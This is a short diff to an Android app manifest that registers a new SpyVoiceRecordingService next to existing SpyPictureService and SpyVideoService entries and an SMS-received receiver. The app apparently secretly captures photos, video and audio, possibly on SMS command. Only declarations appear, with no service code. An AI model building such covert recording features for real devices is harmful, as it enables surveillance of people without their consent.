@@ -25,6 +25,7 @@
         </activity>
         <service android:name=".SpyPictureService"/>
         <service android:name=".SpyVideoService"/>
+        <service android:name=".SpyVoiceRecordingService"/>
         <receiver android:name=".SmsReceiver">
             <intent-filter>
                 <action android:name="android.provider.Telephony.SMS_RECEIVED"/>
